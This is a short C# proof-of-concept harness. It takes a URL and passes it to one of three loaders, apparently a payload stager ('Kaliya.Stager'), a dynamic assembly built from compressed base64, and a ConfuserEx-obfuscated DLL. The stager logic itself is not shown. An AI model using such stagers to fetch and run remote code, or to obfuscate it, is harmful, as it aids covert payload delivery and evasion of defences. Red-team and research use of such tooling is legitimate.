using System;

internal static class Program
{
    private static void Main(string[] args)
    {
        if (args.Length != 2)
        {
            Console.WriteLine("Usage: PoC.exe <static|assembly|obfuscated> <URL>");
            Environment.Exit(1);
        }

        var test = args[0].ToLower();
        var url = args[1];

        switch (test)
        {
            case "static":
                // Basic test, just running the static method.
                Kaliya.Stager.Run(url);
                break;
            case "assembly":
                // Another test, the base64 was generated using Out-CompressedDLL
                // in Debug mode to be able to see the logs
                DynamicAssembly.Run(url);
                break;
            case "obfuscated":
                // An obfuscated Dll using ConfuserEX
                ObfuscatedAssembly.Run(url);
                break;
            default:
                Console.WriteLine("[!] ERROR: Invalid option.");
                break;
        }
    }
}